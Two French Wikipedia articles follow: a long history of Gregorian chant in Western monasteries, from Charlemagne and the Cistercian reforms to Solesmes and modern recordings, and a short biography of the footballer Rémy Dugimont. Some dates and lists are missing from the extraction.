<doc id="8728394" url="https://fr.wikipedia.org/wiki?curid=8728394" title="Tradition du chant grégorien auprès des monastères">
Tradition du chant grégorien auprès des monastères

Si le chant grégorien avait été composé pour la première fois dans le diocèse de Metz à la fin du , ses immenses développement et raffinement furent parachevés auprès des monastères du royaume carolingien durant le siècle suivant, au temps de la Renaissance carolingienne. Dès lors, les abbayes d'Occident demeurent les principaux défenseurs et exécutants de ce chant, premier sommet de la musique occidentale.
Avant la création du chant grégorien.
Auparavant, le rite romain, celui du Saint-Siège, n'était autre que le rite de Rome et alentour, car chaque région conservait son propre rite et ses traditions. En outre, celui des monastères, qui étaient aussi plus indépendants, était très différent de celui des paroisses. L'Église n'autorisa jamais l'hymne ambrosienne jusqu'au alors que saint Benoît de Nursie l'avait adoptée dans sa règle de saint Benoît vers 540.
À cette époque-là, l'abbaye pouvait altérer sa règle monastique. La première communauté auprès de l'abbaye royale de Saint-Denis fut établie, par exemple, vers 600 avec la règle de saint Colomban. Sous le règne de Dagobert I († 639), celle-ci fut brutalement remplacée par la Laus perennis, louange perpétuelle, priant que la dynastie mérovingienne soit toujours protégée par Dieu et continuée.
Charlemagne et l’uniformité du chant grégorien.
Pour la naissance du chant grégorien, il faut remarquer la contribution de l'évêque de Metz Chrodegang, grand animateur du rite romain, en raison duquel ce rite fut déjà adopté dans son diocèse en 754.
Tout comme d'autres grands chefs d'État, Charlemagne était capable de sélectionner proprement ses ministres afin de régner sur son vaste territoire. Si celui-ci réussit à achever sa réforme liturgique pour l'intégration de son royaume, c'était grâce à un moine originaire du Yorkshire, Alcuin († 804). Une fois invité par Charles le Grand il devint collaborateur de celui-ci en faveur de la perfection de la pratique de la liturgie. De fait, en tant que recteur et défenseur de l'Église, le roi inaugura en 785 l'unification de la liturgie selon le rite romain dans tout le royaume en chargeant cette mission à Alcuin. Puis en 789, avec son "Admonitio generalis", il ordonna qu'y soit -sans exception- chanté le chant romain pour l'unicité de l'Église. Dorénavant, tous les chants gallicans devaient être remplacés par ceux de Rome. Pour la première fois dans l'histoire de l'Église d'Occident, une centralisation de la liturgie commença. Comme Alcuin pouvait répondre à cette charge, la liturgie romaine fut certainement implantée dans ce royaume vers 800 à l'exception du chant. De plus, pour la perfection, ce moine corrigea les méprises du texte latin de la liturgie de Rome y compris celui du chant, avant l'usage en Gaule, durant vingt ans. Si la mélodie du chant vieux-romain devait encore être remplacée par le chant grégorien, une hybridation entre la tradition gauloise et celle de Rome, l'uniformité de la liturgie était désormais assurée par Charlemagne. Ce dernier nomma finalement le moine britannique abbé de l'abbaye royale de Tours en 796 ou 797. Aussitôt, Tours devint l'une des capitales de la Renaissance carolingienne.
Alcuin est également l'auteur de l'hymne "Luminis fons" initialement dédiée à Charlemagne. Oubliée longtemps, cette hymne fut retrouvée. Elle est de nos jours en usage dans les monastères pour la célébration des vêpres du lundi des semaines II et IV, d'après la nouvelle "liturgie des Heures" éditée après le concile Vatican II. Donc, il n'existe pas de version en grégorien de la "Luminis fons" :
Quoique sa contribution sur le chant grégorien ne soit pas certaine, un moine espagnol Théodulf aussi soutenait Charlemagne, en tant que collaborateur d'Alcuin ainsi qu'évêque d'Orléans, abbé du monastère de Fleury.
Distinctions :
Tous ceux qui concernent étaient situés loin de Rome.
Certaines abbayes célèbrent encore les offices en grégorien :
Conservation du chant grégorien au sein des monastères.
Le Moyen Âge ne fut jamais une période sans culture raffinée. Les études récentes approfondies sur les documents liturgiques des ainsi que s révèlent une magnifique conjonction entre une haute pertinence de célébration et une extraordinaire sophistication esthétique dans les monastères. Il s'agissait d'un véritable sommet de la musique sacrée.
Manuscrits sangalliens ().
Issus des graphies de l'écriture littéraire, plus précisément des accents, les neumes employés dans les manuscrits de la famille de l'abbaye de Saint-Gall se développèrent aisément afin de préciser le raffinement de la mélodie grégorienne. Aujourd'hui, sauf le manuscrit 376, ces manuscrits sont les plus importants en faveur de l'interprétation authentique du chant grégorien, avec le manuscrit Laon 239, en raison de leur qualité de précision de la mélodie correcte et originale. Pour cet objectif, les neumes de certains manuscrits sont publiés dans le Graduale triplex (1979) ainsi que le Graduale novum (depuis 2011) : 
D'ailleurs, en préparant les neumes requis du Graduale triplex, Dom Rupert Fischer, en qualité de membre de l'AISCGre, choisit également le manuscrit 339 de Saint-Gall .
Graduale Albiense ().
Ce manuscrit méconnu est un grand témoignage de la tradition du chant grégorien au sein de monastère au . Attribué auparavant à la cathédrale Sainte-Cécile d'Albi, il fut en fait, avec certitude, copié en faveur de, puis, était en usage auprès de l'abbaye Saint-Michel de Gaillac au sein du diocèse d'Albi, selon les études approfondies et récentes. Ce monastère subit, à vrai dire en 1079, le changement de son supérieur : de l'abbaye Saint-Pierre de Moissac sous Cluny à l'abbaye de la Chaise-Dieu dirigée par l'abbaye Saint-Géraud d'Aurillac. De sorte qu'il est certain que le livre contient, concernant la liturgie locale ajoutée, deux éléments, ceux de la première et ceux de la deuxième. Pourtant, le manuscrit conservait toujours et parfaitement le chant grégorien traditionnel et authentique duquel il y eut peu de modification ainsi que d'addition. En résumé, l'abbaye ne subit aucun changement de la pratique du chant grégorien, en dépit du bouleversement de la gestion.
Celui-ci est certainement un graduel grégorien typique et respectait complètement la forme traditionnelle. Avec quelques chants rendant hommage à saint Grégoire, le manuscrit se commence à partir du trope "Gregorius præsul" suivi de l'introït "Ad te levavi" du premier dimanche de l'Avent, annonçant le commencement du calendrier liturgique de l'année (folio 4v en bas, 5r et 5v).
Une vraie valeur du manuscrit, découverte par Dom Eugène Cardine de Solesmes, est tellement immense que le Graduale Albiense devint indispensable, de nos jours, en faveur de la restauration de la mélodie authentique en grégorien. Au , à la suite de l'invention de la notation en quatre lignes par Gui d'Arezzo, la mélodie grégorienne n'était plus authentique, afin d'adapter à ce nouveau système. Ce manuscrit Latin 766 est toutefois une précieuse exception, car, grâce à la qualité de ses neumes, sa mélodie est quasiment identique à celle des meilleurs manuscrits sans ligne, manquant de précision de degrés, tels le manuscrit Laon 239, le cantatorium de Saint-Gall, le manuscrit Einsiedeln 121.
Cluny, manuscrits perdus.
L'importance de l'abbaye de Cluny, dite la seconde Rome, est indiscutable même dans l'histoire du chant grégorien. Surtout, cela était les moines de Cluny qui remplacèrent entièrement la pratique du chant mozarabe dans la péninsule Ibérique par celle du chant grégorien, au . Une difficulté considérable, c'est la disparition de manuscrits dans son ancienne bibliothèque. La Bibliothèque nationale de France conserve certes un manuscrit, Latin 1087, dont la qualité n'est malheureusement pas suffisante pour les études. Il n'en reste que des fragments :
Vérité des réformes cisterciennes.
Dans de nombreux documents au regard de la réforme cistercienne dans le domaine liturgique, on a tendance à expliquer, avec la discipline de Cîteaux, la suppression du mélisme du chant grégorien, vraisemblablement inspiré par son architecture simple. Cependant, si l'on consulte ceux que saint Bernard de Clairvaux écrivit, il est difficile de soutenir cette légende. Au contraire, il rédigeait en employant le terme « orner » : « nous avons conservé le texte de plusieurs répons parce qu'il est saint et tirés des Évangiles, et nous les avons ornés d'un chant aussi beau que convenable, tout n'en employant partout qu'une musique sobre et décente. »
Lettre ou prologue de saint Bernard sur l'antiphonier de l'ordre de Cîteaux.
Après avoir remanié l'antiphonaire de l'ordre vers 1147 selon l'intention de ses supérieurs, saint Bernard de Clairvaux adressa une lettre à ceux qui concernaient. Il s'agissait directement du sujet de la deuxième réforme cistercienne, chargée à saint Bernard :
La lettre était donc suivie d'une longue, et non "petite", préface précisant en détail la modification de l'antiphonaire :
Préface ou traité du chant ou de la correction de l'Antiphonier
Pour les sections 3 - 11 (détails et exemples): ainsi que version latine-française par Dom Alfred-Louis Charpentier et Dom P. Dion (1865) (p. 533 - 544 (pdf 541 - 552)).
3. (modalité — note finale)
4. (bémol et bécarre)
5. (encore modalité)
6. (deux demi-tons)
7. (questions des intervalles) 
8. (dix sons, selon la musique grecque et Guy d'Arezzo)
9. (tons authentes et ceux des plagaux)
10. (neumes)
11. (comparaison avec d'autres antiphonaires)
— conclusion
La première réforme fut dirigée par l'abbé Étienne Harding originaire de l'Angleterre. En souhaitant que le rite de l'ordre de Cîteaux soit rétabli selon les sources les plus pures, celui-ci envoya vers 1108 des moines à Metz où était conservé le manuscrit attribué à saint Grégoire I ainsi qu'à Milan en faveur de la tradition ambrosienne, celle des hymnes. En conséquence, le premier antiphonaire de l'ordre issu de l'abbaye Notre-Dame de Molesme fut remplacé par ce nouvel antiphonaire qui provoquerait une grosse confusion auprès de l'ordre.
Quoi qu'il en soit, après le décès de l'abbé Harding en 1134, l'ordre chargea à saint Bernard de remanier les livres de chant et la révision fut effectuée entre 1142 et 1147.
Antiphonaire de Westmalle.
Deux groupes de manuscrits du chant grégorien.
Finalement, les deux réformes cisterciennes furent précisément déterminées, grâce à un manuscrit, l'antiphonaire de Westmalle. Celui-ci, composé de quatre tomes tardivement réunis, est, depuis 1955 environ, conservé auprès de l'abbaye trappiste Notre-Dame du Sacré-Cœur de Westmalle en Belgique. Précieusement, il ne s'agit autre que des livres de chant de ces deux réformes :
Selon le "Corpus antiphonalium officii" de Dom Hesbert, le groupe germanique se représente, par exemple, dans ces manuscrits issus de monastères. Il est probable que les texte et mélodie de ce groupe sont plus anciens :
La tradition latine, quant à elle, se trouve dans ces documents et le reste :
Différences entre les manuscrits WA/WB I et WA/WB II.
Si l'on dit fréquemment la "réforme" cistercienne, la révision de Cîteaux était, à vrai dire, assez modeste. Ainsi, dans la version de Bernard de Clairvaux, devenue définitive de l'ordre vers 1147, on compte 661 couples du responsorial. Deux tiers ou 65,36% de version de Harding furent conservés dans le nouvel antiphonaire. Certes, l'équipe de Bernard remplaça 34,64% de couples. Toutefois, parmi eux, 28,74% se trouvent dans d'autres manuscrits grégoriens. Encore, 26 couples conservaient les répons de Harding mais avec de nouveaux versets, soit 3,93%. 4 couples possède également de nouveaux versets avec les mélodies traditionnelles pour ses répons (0,61%). Les couples complètements nouveaux ne comptent que 9 exemplaires, soit, seulement 1,36%. En bref, saint Bernard n'effectua jamais un appauvrissement ni une rupture avec la tradition.
Puis, l'identification de chaque chant révèle une forte préférence pour la tradition latine dans l'édition définitive. Ceux que l'édition de saint Bernard conservait (65,36%) étaient essentiellement les chants universels, à savoir, ceux qui se trouvent dans toutes les deux traditions. Ainsi, parmi ceux que l'équipe de saint Bernard récupérèrent, 297 couples ou 75% se rencontrent dans le manuscrit de Saint-Maur-des-Fossés, 290 couples soit 73% dans celui de Saint-Denis, 245 (62%) dans celui de Silos. En revanche, la majorité des couples éliminés (34,64%) sont ceux de propre tradition germanique, par exemple, 127 couples sur les 153 soit 83% concernent l'antiphonaire de Hartker. De même, 120 couples (78%) dans celui de Compiègne ainsi que 116 couples ou 76% dans celui de Rheinau. Dans ces cas, les copistes de saint Bernard n'hésitaient pas à remplacer les chants, en cherchant les matériaux dans les archives. En cas d'absence de pièces, de nouveaux chants furent composés (partiellement 4,54% ; totalement 1,36%). Il s'agit exactement du même principe de Solesmes en faveur de la rédaction de l'édition critique Antiphonale monasticum (depuis 2005).
Alors que la version de l'abbé Harding conservait en général le texte original du chant grégorien, la tradition latine employait parfois le texte modifié. Ainsi, l'édition de Harding adoptait pour le premier dimanche après la Pentecôte « Omnes montes qui estis in circuitu ejus visitet Dominus a gelboe transeat » selon la tradition germanique. Celle de saint Bernard remplaça ce texte par « Omnes montes qui in circuitu ejus sunt visitet Dominus a gelboe autem transeat. » Ce dernier est identique à celui d'ancien manuscrit bénédictin de l'abbaye Notre-Dame de Molesme, origine de Cîteaux. D'après Alicia Scarcez, les textes choisis par la version définitive sont, normalement, plus cohérents à la suite de la révision de l'endroit des mots. Cela serait la raison pour laquelle, une fois obtenu le texte de la tradition latine, les moines de Cîteaux appréciaient celui-ci.
À dire vrai, dès les années 1120 jusqu'à son décès, saint Bernard ne cessa pas sa communication intime avec l'abbaye de Molesme. De sorte que l'édition définitive de l'ordre gardait une influence de la liturgie de Molesme. Un seul témoignage, le bréviaire de la Bibliothèque municipale de Troyes 807, manuscrit de Molesme incomplet, indique une similitude parmi les premiers antiphonaires cisterciens. L'édition définitive compte 215 couples identiques sur 350 dans le BM 807, soit 61%. Si l'on consulte les couples communs dans tous les deux antiphonaires, celui de Harding et celui de saint Bernard, le taux augmente jusqu'à 72%, 165 couples sur 230. À savoir, le répertoire bénédictin de Molesme se conservait effectivement dans les éditions suivantes.
Valeur de la version d'Étienne Harding.
En admettant que la première réforme cistercienne n'ait jamais été comprise ni appréciée à l'époque de l'agrandissement de l'ordre de Cîteaux, il faut remarquer que l'édition d'Étienne Harding était une véritable restauration du chant grégorien. D'une part, cet abbé semblait savoir correctement que l'origine de ce chant est attribuée à Metz. C'est la raison pour laquelle celui-ci y avait envoyé ses moines, si le manuscrit original reste aujourd'hui inconnu. D'autre part, la mélodie de sa version est, par conséquent, très proche de la mélodie grégorienne authentique, car, par exemple, remontent aux et s la presque totalité des répons et la majorité des couples répons-versets de l'édition de l'abbé Harding.
Conclusion.
En résumé, la première réforme cistercienne fut effectuée selon l'intention de l'abbé Étienne Harding à partir de 1108 environ, en désirant redécouvrir la forme originale du rite d'après la règle de saint Benoît (vers 540) ainsi que la composition attribuée à saint Grégoire I :
Pourtant, à cause de la différence définitive entre les deux traditions, la version de Harding ne fut jamais appréciée ni acceptée auprès de l'ordre, qui décida de remanier à nouveau les livres de chant. Finalement, depuis 1147, les livres de chant de saint Bernard conservaient la première succession de l'ordre :
Dès les Cisterciens aux Prêcheurs.
Dans les années 1940, le prêtre dominicain Dominique Delalande étudia profondément leur graduel daté de 1254, en souhaitant connaître correctement son origine et réviser le livre avec les manuscrits plus sûrs. Cinq séjours au total auprès de l'abbaye Saint-Pierre de Solesmes lui permirent d'achever son premier objectif. À cette époque-là, les moines de Solesmes constataient déjà une proximité entre les livres de chant des Cisterciens et ceux des Prêcheurs. En consultant les manuscrits de l'atelier de Solesmes, le père Delalande conclut : « le Graduel dominicain est non seulement un très proche parent du cistercien, mais qu'il en dépend étroitement. » 
Donc, aujourd'hui, on peut s'apercevoir une succession de la tradition grégorienne :
Puis, le père Delalande commença à comparer ces deux derniers à d'autres manuscrits plus anciens, y compris des notations sans lignes, ainsi qu'à l'Édition Vaticane. Il considérait que cette dernière est d'une version sous influence de la tradition franciscaine (En fait, celle-ci n'est autre qu'une édition à la base du Liber gradualis de Solesmes, édité et sorti en 1883 par Dom Joseph Pothier.). Naturellement, dans certains cas, il constata un phénomène de l'économie rythmique, à savoir, abréviation des notes et chemin vers le plain-chant : Vaticane (plus longue) &gt; Cistercienne &gt; Dominicaine (moins longue). Cependant, ce phénomène n'était pas nombreux. Il découvrit aussi quelques exemples des mutilations horizontales uniquement dans les notations dominicaines, c'est-à-dire une pratique des deux notes au maximum à la place de plusieurs notes à l'unisson.
Pourtant, cette comparaison scientifique relevait que, parfois, « les Cisterciens ont une vocalise plus longue que celle de l'édition vaticane » ainsi que celle des Prêcheurs. Dans d'autres cas, celles de la Vaticane et celles des Cisterciens sont identiques, et seulement celles des Dominicains sont plus courtes. Ces variations, non très nombreuses, étaient tellement compliquées que Delalande hésitait à attribuer le principe concret à l'exception de la mutilation horizontale.
D'ailleurs, le prêtre dominicain trouva dans les manuscrits cisterciens de nombreuses modifications de notes, essentiellement concernant le demi-ton, le bémol ainsi que la dernière note, qui peuvent provoquer le changement des modes ainsi que des cadences. Tantôt les Prêcheurs suivaient ces modifications, tantôt leurs notations sont identiques à celles de la Vaticane. Vraisemblablement, il s'agissait de ceux que la sémiologie grégorienne appelle de nos jours "décadence", issue de la théorie musicale plus contemporaine.
Au regard du répertoire de l'ordinaire de messe, il est vrai que les Cisterciens économisaient leurs services alors que les Prêcheurs rétablissaient la richesses du répertoire grégorien : 
Concernant la modification modale par les Cisterciens, l'étude d'Alicia Scarcez confirma certainement, en 2011, sa pratique systématique dans l'antiphonaire de Westmalle : 
L'édition de saint Bernard de Clairvaux (vers 1147) modifia systématiquement la cadence de l'édition précédente, celle d'Étienne Harding (après 1108). Par exemple, la version de Bernard effectuait ces modifications au regard du deuxième mode. Ceux qui concernaient comptent 47 versets (2, 6, 15, 31, 46 et le reste) :
Voici un autre exemple concernant 11 versets (23, 48, 84 , 95, 192, 200, 215, 258, 328, 329 et 337) :
Pour les établissements de petite taille.
En résumé, il reste peu de justificatif scientifique pour exprimer la modification du chant grégorien d'après l'adaptation aux règles des ordres, notamment à celles de Cîteaux. En fait, il est probable qu'il s'agissait des arrangements en faveur de petits prieurés.
Le Saint-Siège sortit en 1967 le Graduale simplex, en adoptant le même principe, à la suite du concile Vatican II.
Décadence dès la Renaissance.
L'uniformité du chant grégorien fut définitivement perdue, non seulement dans la liturgie des paroisses mais aussi auprès des monastères, après la Renaissance. Une grave décadence commence après le concile de Trente, faute de nouveaux livres publiés jusqu'en 1814, à savoir jusqu'à ce que soit sortie l'Édition médicéenne. En attendant celle-ci, les livres anciens étaient en usage, avec de nombreuses modifications non autorisées.
Puis, étant donné que le Saint-Siège lui-même avait remanié les livres de saint Grégoire selon les critères des humanistes, les religieux n'hésitèrent plus à demander leurs versions plus simples, plus contemporaines, plus facile à chanter. En France, ils chargèrent un jeune organiste, Guillaume-Gabriel Nivers, de réviser leurs livres. Dorénavant, chaque ordre poursuivait son propre livre de chant selon ses règles.
Comme chaque publication de Nivers était réservée à un ordre particulier, ses versions étaient effectivement nombreuses. Par ailleurs, à la suite d'une collaboration avec l'ordre des Prémontrés dès 1677, cet organiste commença à consulter les sources romaines, en cherchant une manière de la restauration de chant liturgique. Mais celui-ci termina sa vie sans connaître la mélodie authentique en grégorien, car, à cette époque-là, les manuscrits de Rome étaient postérieurs au Concile de Trente.
Contribution des monastères vers la restauration authentique.
Avant la naissance de la sémiologie grégorienne.
Après cette période désastreuse, on retrouva le chant grégorien, surtout à la suite de la découverte du tonaire de Saint-Bénigne de Dijon en 1847. Des moines de deux ordres contribuèrent essentiellement à restaurer cette tradition non seulement dans ce siècle mais aussi au . Il s'agissait de l'ordre des Prêcheurs et celui de Saint-Benoît.
Premiers pas.
Le rétablissement de la liturgie en grégorien se commença au milieu du dans quelques paroisses en Belgique et en France. Ses animateurs étaient les trois cardinaux-archevêques Engelbert Sterckx (Malines), Thomas Gousset (Reims) ainsi que Pierre Giraud (Cambrai). En France, il s'agissait de la publication de l'Édition rémo-cambraisienne sortie en 1851.
Trois ans plus tard, en 1854, un jeune prêtre de l'ordre des Prêcheurs ainsi qu'originaire de Vittel, François-Florentin Bernard, sortit son "Cantus Missarum" à Gand, à l'âge de 28 ans. Dorénavant Pie Bernard, selon le pape dominicain saint Pie V, avait édité son livre de chant, après avoir admiré deux magnifiques manuscrits dans la bibliothèque conventuelle de cette ville. Il est vrai que jusque vers 1873, ce moine profitait principalement des documents de Jérôme de Moravie remontant au , donc un ensemble du répertoire ancien et des matériaux postérieurs. Mais il faut remarquer que, dès 1863, pour ses études, Dom Joseph Pothier de Solesmes bénéficiait de ce "Cantus Missarum", exemplaire envoyé par son ancien professeur à Saint-Dié, l'abbé Jean Hingre. Ainsi, la notation de l'alléluia de saint Joseph "Fac nos innocuam, Ioseph" fut adoptée dans le Liber gradualis (1883), ensuite l'Édition Vaticane (1908) et encore en usage dans le Graduale Romanum (1974).
Apprécié et encouragé par ses supérieurs, il était chargé de continuer à publier de nouveaux livres de chant. En 1864, Pie Bernard paracheva, pour la première fois dans l'histoire du rite dominicain, un ensemble complet de livres de chant. Puis, il engageait, dans les années 1870, sa révision de la mélodie grégorienne dans ces livres. En effet, inspiré par Dom Pothier étant devenu son collaborateur, ce prêtre commença à consulter des manuscrits dominicains les plus anciens, donc plus proches de la tradition grégorienne, en adoptant le rythme mesuré au lieu du rythme mensuraliste auparavant.
Pie Bernard pour son ordre ne cessa pas de remanier les chants grégoriens jusqu'à son décès en 1897. Ses deux dernières publications, effectuées en 1890 et 1894, étaient si différentes de celles des années précédentes, sous influence de Solesmes, que le chapitre de l'ordre dut exhorter explicitement les novices, les étudiants et tous les autres religieux à étudier avec zèle « ces choses relatives au chant. »
Restauration par les Bénédictins.
Avant l'officialisation du chant grégorien en 1903.
L'éditeur du "Liber gradualis", Dom Joseph Pothier, avait d'ailleurs amélioré l'impression de la notation grégorienne. En collaboration avec les Éditions Desclée, il avait réalisé une nouvelle composition typographique grégorienne, pour la publication de son livre théorique "Mélodies Grégoriennes" en 1880.
En 1901, l'abbé de Solesmes Dom Paul Delatte écrit :
Congrès grégoriens d'Aiguebelle en faveur des Trappistes.
À mesure que la restauration s'avançait, la liturgie en grégorien était de plus en plus appréciait. Ainsi, les Trappistes décidèrent de rejoindre le mouvement de la réforme grégorienne. En faveur des abbés et des chantres de l'ordre, Dom Pothier assista en 1879 et 1881 aux congrès grégoriens d'Aiguebelle.
Après le "motu proprio" "Inter pastoralis officii sollicitudes".
Le pape Pie X officialisa le chant grégorien en 1903 avec son motu proprio "Inter pastoralis officii sollicitudes."
L'abbaye de Solesmes était chargée par le Saint-Siège de préparer les matériaux de manuscrits en faveur de l'Édition Vaticane, à partir de 1904 pour la première commission dont Dom André Mocquereau était un membre, jusqu'à ce qu'une grosse difficulté n'empêche cette collaboration en 1905, puis pour la deuxième commission dès 1913. Mission si honorable, mais cela n'était autre que des travaux gratuits. À plein temps, 12 moines se consacraient à ce projet, en renonçant tous les droits littéraires
La parution de l'Édition Vaticane, à partir de 1905 (Kyriale), favorisa le remaniement des livres de chant des ordres. Ainsi, l'abbaye de Solesmes inaugura un nouveau projet de l'antiphonaire après la Première Guerre mondiale et sortit en 1934 l"'Antiphonale monasticum pro diurnis horis" en faveur de son ordre de Saint-Benoît.
Les abbayes bénédictines de femmes aussi contribuaient au chant grégorien. Ainsi, lorsque Dom Mocquereau publia le tome II de son célèbre "Nombre musical grégorien ou rythmique grégorienne" en 1927, les moniales de l'abbaye Saint-Michel de Kergonan avaient préparé les dessins ainsi que les tables :
Cette abbaye située en Bretagne respecte toujours les offices en grégorien. Surtout, celle-ci soutient l'émission de la Radio Espérance qui diffuse en direct les célébrations en grégorien.
Vers la version restaurée.
Avant que la sémiologie grégorienne, une nouvelle science, ne soit établie dans les années 1950, le père Dominique Delalande auprès de l'ordre des Prêcheurs souhaitait réviser leur graduel daté de 1254, avec les manuscrits plus anciens et en faveur d'une édition plus correcte. Dans cette optique, il sollicita cinq fois, entre 1942 et 1945, l'atelier de la "Paléographie musicale" de Solesmes, en lui proposant une collaboration. À vrai dire, après être libéré de sa captivité lors de Pâques en 1942, ce prêtre avait décidé de se consacrer singulièrement aux études du chant grégorien et obtenu son autorisation par son supérieur. Si l'abbaye n'avait pas subi la Deuxième Guerre mondiale, la première édition critique du chant grégorien aurait été achevée, en profitant d'un grand nombre de photos de manuscrits conservées à l'atelier. En réalité, ce dernier ne comptait que deux moines, le directeur Dom Joseph Gajard et Dom René-Jean Hesbert. Le prêtre dominicain put cependant publier en 1949, à la suite de ces cinq séjours, ses études approfondies chez Cerf et sous le titre "Le Graduel des Prêcheurs : vers la version authentique du Graduel Grégorien : Recherches sur les sources et la valeur de son texte musical".
Après les années 1950.
Sémiologie.
Mais la sémiologie grégorienne alla plus loin. Elle réussit à analyser précisément la composition de ce chant selon un lien étroit entre le texte en latin et la mélodie. En faveur d'une interprétation authentique, il n'est pas suffisant que l'on connaisse les neumes anciens. Il faut tout d'abord une bonne compréhension du texte latin. De plus, on doit connaître des formes et l'histoire du répertoire grégorien, et enfin, les contextes rituels de la Bible, notamment ceux du psaume.Aujourd'hui, il existe un monastère où le supérieur est un musicologue grégorien, en France. Il s'agit de l'abbaye Notre-Dame de Triors à laquelle l'abbé Hervé Courau assure la qualité de vie bénédictine et grégorienne des moines.
Au regard des livres de chant, l'édition critique tel l'Antiphonale monasticum est désormais essentielle. L'abbaye de Solesmes commença la publication de cet antiphonaire officiel en 2005, en faveur de son ordre. L'objectif de cette édition est une restauration de ceux que les moines carolingiens chantaient exactement il y a 1050 ans environ, à la base de l'antiphonaire de Hartker (vers 1000), et non une synthèse des manuscrits comme auparavant, jamais chantée.
Concile Vatican II.
Concernant le monastère, le concile Vatican II se caractérisait notamment de sa réforme de la liturgie des Heures. Cette modification était si drastique dans l'histoire de l'Église que les abbayes qui adoptèrent le nouveau livre d'Heures ne pouvaient plus suivre sans difficulté les chants traditionnels en grégorien. Il est normal qu'une solution ait été trouvée par la communauté Saint-Martin qui poursuit toujours la cohérence entre la tradition solennelle et la réforme issue du concile. Après quelques années de rédaction, celle-ci sortit en 2008 les "Heures grégoriennes" en bilangue grâce auxquelles de nombreux monastères adoptant la nouvelle liturgie des Heures rétablirent la célébration en grégorien. S'il ne s'agit pas d'édition officielle, l'approbation avait été donnée par l'ecclésiastique de haut rang. L'abbaye de Solesmes aussi avait soutenu ce projet, en préparant plus de requises.
De nos jours.
Enregistrement de disques.
Il est vrai que de nos jours, un certain nombre d'abbayes n'hésitent pas à enrichir leurs albums du chant grégorien. D'abord, l'enregistrement contribue à améliorer la connaissance des gens, qui ne sont pas nécessairement les amateurs de la musique classique. Ensuite, ces disques soutiennent l'interprétation des maîtres de chapelle, des chefs de chœur, des membres de scholæ grégoriennes. Enfin, la vente des CD et des DVD aide à financer les monastères, par exemple l'abbaye Saint-Pierre de Solesmes, l'abbaye Notre-Dame de Triors.
L'histoire de l'enregistrement du chant grégorien s'illustre autant que celle du disque soi-même. En 1904 déjà, les Bénédictins et les Augustins participèrent aux enregistrements de la Société Gramophone en collaboration avec le Vatican, lors du centenaire de saint Grégoire († 604). En 1930, Gramophone enregistra à nouveau plusieurs chants du chœur de Solesmes sous la direction de Dom Joseph Gajard. Devenu CD, cet enregistrement est encore disponible. 54 ans plus tard, à savoir en 1984, cette schola décrocha le Grand prix de l'Académie du disque français, grâce à l'interprétation sémiologique par Dom Jean Claire, avec son disque "Noël, Messe de jour et Messe de nuit".
Vocation des jeunes.
Fondée en 1889, l'abbaye Saint-Paul de Wisques, un des monastères de la congrégation de Solesmes, risquait de disparaître, après avoir perdu la tradition grégorienne. En effet, celle-ci ne comptait en 2013 que quelques moines avec un âge moyen de 72 ans. À peine accueillit-elle 13 religieux de l'abbaye Notre-Dame de Fontgombault le , la liturgie grégorienne fut rétablie le lendemain, afin de dynamiser de nouveau la vie monastique.
Cette abbaye de Fontgombault, fondée en 1948 au sein d'une ancienne église romane, avait créé jusqu'ici plusieurs filiales dont abbaye Notre-Dame de Triors.
Contribution sur la célébration en grégorien avec les fidèles.
Il est vraiment important que ces ordres répartissent la célébration en forme extraordinaire avec les fidèles laïcs, non seulement auprès de leurs monastères mais également dans les églises de villes. À vrai dire en France, les offices en grégorien célébrés par les ordres sont plus nombreux que ceux des diocèses. En outre, plus de scholæ grégoriennes sont soigneusement soutenues par les ordres religieux qu'auprès des paroisses.

</doc>
<doc id="8728395" url="https://fr.wikipedia.org/wiki?curid=8728395" title="Rémy Dugimont">
Rémy Dugimont

Rémy Dugimont, né le à Saint-Cloud (Hauts-de-Seine, France), est un footballeur français qui évolue au poste d'attaquant à la JS saint-pierroise.
Biographie.
Formation et débuts.
Rémy Dugimont commence sa formation au Club Sportif Cellois Football à La Celle Saint-Cloud puis est formé au Paris Saint-Germain où il joue avec les U13 puis les U15. Après trois ans passés avec le club parisien, il s'engage avec le club amateur du Chesnay, où il évolue jusqu'en senior. Il rejoint ensuite pour une saison Levallois, qui est en CFA 2. En 2008, il rejoint Poissy, qui évolue en CFA 2. Après deux saisons dans ce championnat, le club parvient à monter en CFA. Le début de saison 2009-2010 est difficile pour le club qui enchaîne les mauvais résultats. Il parvient néanmoins à se maintenir dans le championnat et réalise un beau parcours en Coupe de France. Le jeune attaquant réalise l'une des saisons les plus abouties de sa carrière en inscrivant 15 buts en championnat et 6 en coupe. Durant la saison 2010-2011, ses bonnes performances le font connaître du public.
Rouen (2011-2013).
Il s'engage pour Rouen en 2011 et découvre pour la première fois le National.Il s'impose rapidement au sein des Normands malgré quelques blessures. Il enchaîne les bonnes performances individuelles et se fait remarquer par plusieurs clubs.
Clermont (2013-2018).
Le , Dugimont s'engage avec le Clermont Foot pour deux saisons, découvrant pour la première fois de sa carrière le football professionnel. Lors de sa première saison, Dugimont peine à se faire une place de titulaire indiscutable.
Son début de saison 2014-2015 est difficile, il se blesse au dos dès le début de saison et s'éloigne des terrains quelques mois. Il reprend avec l'équipe réserve du club. Lors d'un match face à Caen en Coupe de la Ligue, il marque un but et signe son retour. En , durant un match de championnat contre Ajaccio, alors que son équipe est menée au score, il marque le but égalisateur qui permet aux Auvergnats de prendre un point important. En seconde partie de saison, Dugimont se montre plus décisif, comme son but contre Brest durant la dernière journée de championnat. L'attaquant devient peu à peu un élément important de l'attaque clermontoise. En mai, il prolonge son contrat avec le club de deux ans.
Alors qu'il était encore muet lors de la saison 2015-2016 malgré 15 matchs disputés, il inscrit un triplé le au de la Coupe de France face à Blagnac, club de CFA2, pour une victoire 3 à 1. L'explosion du sénégalais Famara Diedhiou, meilleur buteur de Ligue 2, oblige Dugimont à se montrer plus discret devant le but.
Le départ de Diedhiou à l'été 2016 lui libère du temps de jeu. Dugimont devient réellement un pilier de Clermont durant la saison 2016-2017 où il retrouve son sens du but. Ainsi, l'attaquant clôt l'exercice avec treize buts et six passes décisives en championnat. 
Dugimont marque onze buts en championnat à l'issue de la saison 2017-2018, dont deux doublés inscrits contre Orléans et Valenciennes, et distille quatre passes décisives.
L'attaquant dispute deux matchs à l'aube de la saison 2018-2019 avant de s'engager pour Auxerre. En cinq saisons au club auvergnat, Dugimont dispute cent quatre-vingt-quatre matchs officiels pour cinquante-et-un buts.
AJ Auxerre (depuis 2018).
Après un bras de fer entre présidents clermontois et auxerrois, Dugimont signe finalement à l'AJ Auxerre le un contrat de trois ans.
